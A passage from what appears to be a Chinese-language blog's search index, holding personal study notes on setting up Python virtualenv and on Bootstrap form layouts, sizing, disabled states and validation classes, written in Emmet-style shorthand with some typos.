      <url>/categories/Python/python-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/python-%E7%8B%AC%E7%AB%8B%E7%9A%84%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83-virtualenv%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p>安装的包都在目录 <code>site-packages</code><br>多个应用程序公用依赖包，需要版本不同时需要 <code>virtualenv</code></p><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install virtualenv</span><br><span class="line"><span class="keyword">find</span> <span class="regexp">/ --name virtualenv  # 找安装目录 .../</span>python3<span class="regexp">/bin/</span>virtualenv</span><br><span class="line">cp -s ...<span class="regexp">/python3/</span>bin<span class="regexp">/virtualenv /</span>~~usr~~<span class="regexp">/bin/</span>virtualenv</span><br></pre></td></tr></table></figure><h5 id="使用-Linux-环境"><a href="#使用-Linux-环境" class="headerlink" title="使用(Linux 环境)"></a>使用(Linux 环境)</h5><ul><li>创建并打开工程目录<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> myproject</span><br><span class="line"><span class="built_in">cd</span> myproject/</span><br></pre></td></tr></table></figure></li><li>创建独立的运行环境 ，命名为<code>venv</code><span id="more"></span><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># no-site-packages  安装到系统python环境的所有第三方包都不复制过来</span></span><br><span class="line"><span class="attribute">virtualenv</span> --<span class="literal">no</span>-site-packages venv</span><br></pre></td></tr></table></figure></li><li>进入环境<br><code>source venv/bin/activate</code></li><li>退出venv环境<br><code>deactivate </code></li><li>删除环境 <code>venv</code><br><code>rm -rf ./venv</code></li></ul><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>windows 下，virutalenv 的目录最好不要包含中文！</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> python 常见问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> virtualenv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4, 表单</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/Bootstrap%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/4-%E8%A1%A8%E5%8D%95/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/Bootstrap%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/4-%E8%A1%A8%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<h4 id="复选框"><a href="#复选框" class="headerlink" title="复选框"></a>复选框</h4><h5 id="复选框组"><a href="#复选框组" class="headerlink" title="复选框组"></a>复选框组</h5><p>   将一组复选框或单选按钮组合成一组并排放置的Bootstrap按钮</br><br>    <img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0zteete2mj307f01j3ya.jpg" alt="img"><br>  <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">bootstrap<span class="selector-class">.min</span><span class="selector-class">.css</span></span><br><span class="line">jquery<span class="selector-class">.min</span><span class="selector-class">.js</span></span><br><span class="line">bootstrap<span class="selector-class">.min</span><span class="selector-class">.js</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.btn-group</span><span class="selector-attr">[data-toggle=buttons]</span></span><br><span class="line">    <span class="selector-tag">label</span><span class="selector-class">.btn</span><span class="selector-class">.btn-default</span><span class="selector-class">.active</span></span><br><span class="line">        <span class="selector-tag">input</span><span class="selector-attr">[type=checkbox]</span></span><br><span class="line">        &#123;Option <span class="number">1</span>｝</span><br><span class="line">    <span class="selector-tag">label</span><span class="selector-class">.btn</span><span class="selector-class">.btn-default</span></span><br><span class="line">        <span class="selector-tag">input</span><span class="selector-attr">[type=checkbox]</span></span><br><span class="line">        &#123;Option <span class="number">2</span>&#125;</span><br><span class="line">    <span class="selector-tag">label</span><span class="selector-class">.btn</span><span class="selector-class">.btn-default</span></span><br><span class="line">        <span class="selector-tag">input</span><span class="selector-attr">[type=checkbox]</span></span><br><span class="line">        &#123;Option <span class="number">3</span>&#125;</span><br><span class="line">------------</span><br><span class="line">lable 里面 有个 <span class="selector-tag">input</span> checkbox</span><br><span class="line">data-toggle=buttons  用来切换复选框样式</span><br><span class="line">类active   checkbox 预选</span><br></pre></td></tr></table></figure></p><hr><span id="more"></span><h4 id="表单布局"><a href="#表单布局" class="headerlink" title="表单布局"></a>表单布局</h4><pre><code>垂直表单水平表单内联表单</code></pre><h5 id="垂直表单-在顶部以左对齐标签堆叠"><a href="#垂直表单-在顶部以左对齐标签堆叠" class="headerlink" title="垂直表单 (在顶部以左对齐标签堆叠)"></a>垂直表单 (在顶部以左对齐标签堆叠)</h5><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0uah8vht7j30ff067mx4.jpg" alt="img"><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span><span class="selector-class">.bs-example</span></span><br><span class="line">    <span class="selector-tag">form</span></span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.form-group</span></span><br><span class="line">            <span class="selector-tag">label</span><span class="selector-attr">[for=inputEmail]</span>&#123;Email&#125;</span><br><span class="line">            input<span class="selector-id">#inputEmail</span><span class="selector-class">.form-control</span><span class="selector-attr">[type=email]</span><span class="selector-attr">[placeholder=Email]</span></span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.form-group</span></span><br><span class="line">            <span class="selector-tag">label</span><span class="selector-attr">[for=inputPassword]</span>&#123;Password&#125;</span><br><span class="line">            input<span class="selector-id">#inputPassword</span><span class="selector-class">.form-control</span><span class="selector-attr">[type=password]</span><span class="selector-attr">[placeholder=<span class="string">&quot;password&quot;</span>]</span></span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.checkbox</span></span><br><span class="line">            <span class="selector-tag">label</span></span><br><span class="line">                <span class="selector-tag">input</span><span class="selector-attr">[type=checkbox]</span>Remember me</span><br><span class="line">        <span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-primary</span><span class="selector-attr">[type=submit]</span>&#123;Login&#125;</span><br><span class="line">----------------------</span><br><span class="line">placeholder=<span class="string">&#x27;Email&#x27;</span>   框里面的提示信息 <span class="string">&#x27;Email&#x27;</span></span><br><span class="line">autocomplete=<span class="string">&#x27;off&#x27;</span>   关闭(存储填写记录)</span><br><span class="line"><span class="selector-class">.form-control</span> 默认宽度是<span class="number">100%</span>；全角元素？</span><br><span class="line"><span class="selector-class">.form-group</span>    标签和对应的输入 需要一个这个<span class="selector-tag">div</span> 类？</span><br></pre></td></tr></table></figure><!--more--><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0zx75eqptj30c309z74e.jpg" alt="img"><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">   $(&quot;.myDropdownHandle&quot;).dropdown(<span class="string">&#x27;toggle&#x27;</span>);  //???</span><br><span class="line">   </span><br><span class="line">form.form</span><br><span class="line">    div.form-<span class="keyword">group</span></span><br><span class="line">        label[<span class="keyword">for</span>=nameField]&#123;<span class="type">Name</span>&#125;</span><br><span class="line">        <span class="keyword">input</span>#nameField.form-control[<span class="keyword">type</span>=<span class="type">text</span>][placeholder=Your <span class="type">Name</span>]</span><br><span class="line">    div.form-<span class="keyword">group</span></span><br><span class="line">        label[<span class="keyword">for</span>=emailField]&#123;Email&#125;</span><br><span class="line">        <span class="keyword">input</span>#emailField.form-control[<span class="keyword">type</span>=email][placeholder=Your Email]</span><br><span class="line">    div.form-<span class="keyword">group</span></span><br><span class="line">        label[<span class="keyword">for</span>=phoneField]&#123;Phone&#125;</span><br><span class="line">        <span class="keyword">input</span>#phoneField.form-control[<span class="keyword">type</span>=<span class="type">text</span>][placeholder=Your Phone Number]</span><br><span class="line">    div.form-<span class="keyword">group</span></span><br><span class="line">        lable[<span class="keyword">for</span>=descField]&#123;Dedcription&#125;</span><br><span class="line">        <span class="keyword">input</span>#descField.form-control[<span class="keyword">type</span>=<span class="type">text</span>][placeholder=Your Comments]</span><br><span class="line">    button.btn.btn-<span class="keyword">primary</span>[<span class="keyword">type</span>=submit]&#123;submit&#125;</span><br><span class="line">    button.btn.btn-<span class="keyword">default</span>[<span class="keyword">type</span>=<span class="keyword">reset</span>]&#123;<span class="keyword">Reset</span>&#125;</span><br></pre></td></tr></table></figure>##### 水平表单<img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0uc3qi2zoj30i607qaa7.jpg" alt="img"><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    $(<span class="string">&quot;.myDropdownHandle&quot;</span>).dropdown(&#x27;toggle&#x27;); <span class="comment">//?/?</span></span><br><span class="line">    </span><br><span class="line">div.<span class="keyword">bs</span>-example</span><br><span class="line">    <span class="keyword">form</span>.<span class="keyword">form</span>-horizontal</span><br><span class="line">        div.<span class="keyword">form</span>-group</span><br><span class="line">            <span class="keyword">label</span>.col-xs-2[<span class="keyword">for</span>=nameField]&#123;Name&#125;</span><br><span class="line">            div.col.xs-10</span><br><span class="line">                <span class="keyword">input</span>#nameField.<span class="keyword">form</span>-control[placeholder=Your Name][<span class="keyword">type</span>=text]</span><br><span class="line">        div.<span class="keyword">form</span>-group</span><br><span class="line">            同上</span><br><span class="line">        div.<span class="keyword">form</span>-group</span><br><span class="line">            同上</span><br><span class="line">        div.<span class="keyword">form</span>-group</span><br><span class="line">            同上</span><br><span class="line">        button  同上</span><br><span class="line">        button </span><br><span class="line">------</span><br><span class="line">与垂直表单相比，多了</span><br><span class="line">    <span class="keyword">form</span>.<span class="keyword">form</span>-horizontal</span><br><span class="line">    <span class="keyword">label</span>.col-xs-2    div.col.xs-10</span><br></pre></td></tr></table></figure><h5 id="内联表单-Δ"><a href="#内联表单-Δ" class="headerlink" title="内联表单 Δ"></a>内联表单 Δ</h5><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0uc55kjdbj30mp02vaa0.jpg" alt="img"><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0uc5m7cr8j30jg06umx8.jpg" alt="img"><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">   $(<span class="string">&#x27;.myDropdownHandle&#x27;</span>)<span class="selector-class">.dropdown</span>(<span class="string">&#x27;toggle&#x27;</span>)  <span class="comment">//?????</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.well</span><span class="selector-class">.well-sm</span></span><br><span class="line">    <span class="selector-tag">form</span><span class="selector-class">.form-inline</span></span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.form-group</span></span><br><span class="line">            input<span class="selector-id">#emailField</span><span class="selector-class">.form-control</span><span class="selector-attr">[placeholder=Enter email[type=email]</span></span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.form-group</span></span><br><span class="line">            input<span class="selector-id">#passwordField</span><span class="selector-class">.form-control</span><span class="selector-attr">[placeholder=Password]</span><span class="selector-attr">[type=password]</span></span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.checkbox</span></span><br><span class="line">            <span class="selector-tag">label</span></span><br><span class="line">                <span class="selector-tag">input</span><span class="selector-attr">[type=checkbox]</span>Rember me</span><br><span class="line">        <span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-primary</span><span class="selector-attr">[type=submit]</span>&#123;Sigb <span class="keyword">in</span>&#125;</span><br><span class="line">------</span><br><span class="line">与垂直表单的区别：</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.well</span><span class="selector-class">.well-sm</span>   引起内容凹陷的容器</span><br><span class="line">     <span class="selector-tag">form</span><span class="selector-class">.form-inline</span>  表单所有元素是内联的，向左对齐的，标签是并排的</span><br><span class="line">            </span><br></pre></td></tr></table></figure><h4 id="表单控件尺寸"><a href="#表单控件尺寸" class="headerlink" title="表单控件尺寸"></a>表单控件尺寸</h4><h5 id="高度输入与选择框-input-xx"><a href="#高度输入与选择框-input-xx" class="headerlink" title="高度输入与选择框 input-xx"></a>高度输入与选择框 <code>input-xx</code></h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">form</span></span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.row</span></span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.col-xs-6</span></span><br><span class="line">            <span class="selector-tag">input</span><span class="selector-class">.form-control</span><span class="selector-class">.input-lg</span><span class="selector-attr">[type=text]</span><span class="selector-attr">[placeholder=Larger input]</span></span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.col-xs-6</span></span><br><span class="line">            select<span class="selector-class">.form-control</span><span class="selector-class">.input-lg</span></span><br><span class="line">                option&#123;Larger select&#125;</span><br><span class="line">        br</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.row</span></span><br><span class="line">      input-lg    <span class="selector-tag">input</span>   input-sm</span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g113587spwj30tr04o74b.jpg" alt="img"><h5 id="尺寸与网格列尺寸相匹配"><a href="#尺寸与网格列尺寸相匹配" class="headerlink" title="尺寸与网格列尺寸相匹配"></a>尺寸与网格列尺寸相匹配</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">form</span></span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.row</span></span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.col-xs-3</span></span><br><span class="line">            <span class="selector-tag">input</span><span class="selector-class">.form-control</span><span class="selector-attr">[type=text]</span></span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.col-xs-4</span></span><br><span class="line">            <span class="selector-tag">input</span><span class="selector-class">.form-control</span><span class="selector-attr">[type=text]</span></span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.col-xs-5</span></span><br><span class="line">            <span class="selector-tag">input</span><span class="selector-class">.form-control</span><span class="selector-attr">[type=text]</span></span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.row</span></span><br><span class="line">        <span class="selector-tag">textarea</span>....</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.row</span></span><br><span class="line">        select<span class="selector-class">.form-control</span></span><br><span class="line">            option&#123;Select&#125;</span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g113nemba9j30jv05b0sm.jpg" alt="img"><h5 id="输入组的高度-input-group-xx"><a href="#输入组的高度-input-group-xx" class="headerlink" title="输入组的高度 input-group-xx"></a>输入组的高度 <code>input-group-xx</code></h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">css js</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.row</span></span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.col-xs-4</span></span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.input-group</span><span class="selector-class">.input-group-lg</span></span><br><span class="line">            <span class="selector-tag">span</span><span class="selector-class">.input-group-addon</span></span><br><span class="line">                <span class="selector-tag">span</span><span class="selector-class">.glyphicon</span><span class="selector-class">.glyphicon-user</span></span><br><span class="line">            <span class="selector-tag">input</span><span class="selector-class">.form-control</span><span class="selector-attr">[type=text]</span></span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.col-xs-4</span></span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.input-group</span><span class="selector-class">.input-group-lg</span></span><br><span class="line">            <span class="selector-tag">span</span><span class="selector-class">.input-group-addon</span></span><br><span class="line">                <span class="selector-tag">input</span><span class="selector-attr">[type=checkbox]</span></span><br><span class="line">            <span class="selector-tag">input</span><span class="selector-class">.form-control</span><span class="selector-attr">[type=text]</span></span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.col-xs-4</span></span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.input-group</span><span class="selector-class">.input-group-lg</span></span><br><span class="line">            <span class="selector-tag">div</span><span class="selector-class">.input-group-btn</span></span><br><span class="line">                <span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-default</span><span class="selector-attr">[tabindex=-1]</span>&#123;Action&#125;</span><br><span class="line">                <span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-default</span><span class="selector-class">.dropdown-toggle</span><span class="selector-attr">[data-toggle=dropdown]</span></span><br><span class="line">                    <span class="selector-tag">span</span><span class="selector-class">.caret</span></span><br><span class="line">                    <span class="selector-tag">span</span>.sr-only&#123;Toggle Dropdown&#125;</span><br><span class="line">                <span class="selector-tag">ul</span><span class="selector-class">.dropdown-menu</span></span><br><span class="line">                    li&gt;<span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;Action&#125;</span><br><span class="line">                    li&gt;<span class="selector-tag">a</span><span class="selector-attr">[href=<span class="string">&quot;#&quot;</span>&#123;Another action]</span></span><br><span class="line">                    <span class="selector-tag">li</span><span class="selector-class">.divider</span></span><br><span class="line">                    li&gt;<span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;Separated link&#125;</span><br><span class="line">            <span class="selector-tag">input</span><span class="selector-class">.form-control</span><span class="selector-attr">[type=text]</span></span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.col-xs-4</span></span><br><span class="line">        ...</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g11533yrd8j30m304z0ss.jpg" alt="img"><h4 id="表单禁用和只读"><a href="#表单禁用和只读" class="headerlink" title="表单禁用和只读"></a>表单禁用和只读</h4><h5 id="禁用表单控件"><a href="#禁用表单控件" class="headerlink" title="禁用表单控件"></a>禁用表单控件</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span></span><br><span class="line">    <span class="selector-tag">input</span><span class="selector-class">.form-control</span><span class="selector-attr">[type=text]</span><span class="selector-attr">[placeholder=Disabled input here...]</span><span class="selector-attr">[disabled]</span></span><br><span class="line">-------</span><br><span class="line">disabled</span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g115dejtb5j305500ra9t.jpg" alt="img">##### 禁用字段集通过向 <fieldset> 元素中添加 disabled 属性来禁用字段集中的所有表单控件<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">form</span>.<span class="keyword">form</span>-horizontal</span><br><span class="line">    fieldset[disabled=disabled]</span><br><span class="line">        div.<span class="keyword">form</span>-group</span><br><span class="line">            <span class="keyword">label</span>.control-<span class="keyword">label</span>.col-xs-2[<span class="keyword">for</span>=inputEmail]&#123;Email&#125;</span><br><span class="line">            div.col-xs-10</span><br><span class="line">                <span class="keyword">input</span>#inputEmail.<span class="keyword">form</span>-control[<span class="keyword">type</span>=email][placeholder=Email]</span><br><span class="line">        div.<span class="keyword">form</span>-group</span><br><span class="line">            <span class="keyword">label</span>.control-<span class="keyword">label</span>.colxs-2[<span class="keyword">for</span>=inputPassword]&#123;password&#125;</span><br><span class="line">            div.col-xs-10</span><br><span class="line">                <span class="keyword">input</span>#inputPassword.<span class="keyword">form</span>-control[<span class="keyword">type</span>=password][placeholder=Passowrd]</span><br><span class="line">        div.<span class="keyword">form</span>-group</span><br><span class="line">            div.col-xs-offset-2.col-xs-10</span><br><span class="line">                div.checkbox</span><br><span class="line">                    lable&gt;<span class="keyword">input</span>[<span class="keyword">type</span>=checkbox]^&#123;Rember me&#125;</span><br><span class="line">        div.<span class="keyword">form</span>-group</span><br><span class="line">            div.col-xs-offset-2.col-xs-10</span><br><span class="line">                button.btn.btn-primay[<span class="keyword">type</span>=submit&#125;&#123;Login&#125;</span><br><span class="line">        </span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g115frk7yij30ke055dfs.jpg" alt="img"><h5 id="只读"><a href="#只读" class="headerlink" title="只读"></a>只读</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span><span class="selector-class">.bs-example</span></span><br><span class="line">    <span class="selector-tag">form</span></span><br><span class="line">        <span class="selector-tag">input</span><span class="selector-class">.form-control</span><span class="selector-attr">[placeholder=<span class="string">&quot;Readonly input&quot;</span>]</span><span class="selector-attr">[readonly=readonly]</span></span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g1177wkwplj308d01ht8h.jpg" alt="img"><h4 id="表单帮助"><a href="#表单帮助" class="headerlink" title="表单帮助"></a>表单帮助</h4><h5 id="helper类"><a href="#helper类" class="headerlink" title="helper类"></a>helper类</h5><p>用户在输入字段中输入无效值时候显示一些自定义文本。(使用带help-block类的span元素)</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">form</span><br><span class="line"><span class="code">    input.form-control[type=text]</span></span><br><span class="line"><span class="section">    span.help-block&#123;A block of text that ...&#125;</span></span><br><span class="line"><span class="section">--------</span></span><br><span class="line">不知道有什么作用</span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g117fcab07j30do02ja9x.jpg" alt="img"><h5 id="表单静态控件"><a href="#表单静态控件" class="headerlink" title="表单静态控件"></a>表单静态控件</h5><p>在水平表单布局中的表单标签旁放置纯文本，请在&lt;p&gt;元素上使用 <code>.form-control-static</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">form</span><span class="selector-class">.form-horizontal</span></span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.form-group</span></span><br><span class="line">        <span class="selector-tag">label</span><span class="selector-class">.control-label</span><span class="selector-class">.col-xs-2</span><span class="selector-attr">[for=inputEmail]</span>&#123;Email&#125;</span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.col-xs-10</span></span><br><span class="line">            <span class="selector-tag">p</span>.form-control-static&#123;harrypotter@mail.com&#125;</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.form-group</span></span><br><span class="line">        <span class="selector-tag">label</span><span class="selector-class">.control-label</span><span class="selector-class">.col-xs-2</span><span class="selector-attr">[for=inputPassword]</span>&#123;Password&#125;</span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.col-xs-10</span></span><br><span class="line">            p<span class="selector-id">#inputPassword</span><span class="selector-class">.form-control</span><span class="selector-attr">[type=password]</span><span class="selector-attr">[placeholder=Password]</span></span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.form-group</span></span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.col-xs-offset-2</span><span class="selector-class">.col-xs-10</span></span><br><span class="line">            label&gt;<span class="selector-tag">input</span><span class="selector-attr">[type=checkbox]</span>^&#123;Remember me&#125;</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.form-group</span></span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.col-xs-offset-2</span><span class="selector-class">.col-xs-10</span></span><br><span class="line">            <span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-primary</span><span class="selector-attr">[type=submit]</span>&#123;Login&#125;</span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g117gspzutj30hp05amx5.jpg" alt="img"><h4 id="表单验证"><a href="#表单验证" class="headerlink" title="表单验证"></a>表单验证</h4><h5 id="三个验证状态"><a href="#三个验证状态" class="headerlink" title="三个验证状态"></a>三个验证状态</h5><ul><li><code>has-success</code>将使标签文本和边框字段的颜色变为绿色</li><li><code>has-error</code>将使用棕色</li><li><code>has-warning</code>将使用深红色</li><li>会将颜色应用与<code>form-control</code>,<code>control-label</code>和<code>help-block</code>类元素。<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">form</span><span class="selector-class">.form-horizontal</span></span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.form-group</span><span class="selector-class">.has-success</span></span><br><span class="line">        <span class="selector-tag">label</span><span class="selector-class">.col-xs-2</span><span class="selector-class">.control-label</span><span class="selector-attr">[for=inputSuccess]</span>&#123;Username&#125;</span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.col-xs-10</span></span><br><span class="line">            input<span class="selector-id">#inputSuccess</span><span class="selector-class">.form-control</span><span class="selector-attr">[placeholder=Input with success]</span><span class="selector-attr">[type=text]</span></span><br><span class="line">            <span class="selector-tag">span</span>.help-block&#123;Username is available&#125;</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.form-group</span><span class="selector-class">.has-worning</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.form-group</span><span class="selector-class">.has-error</span></span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><img 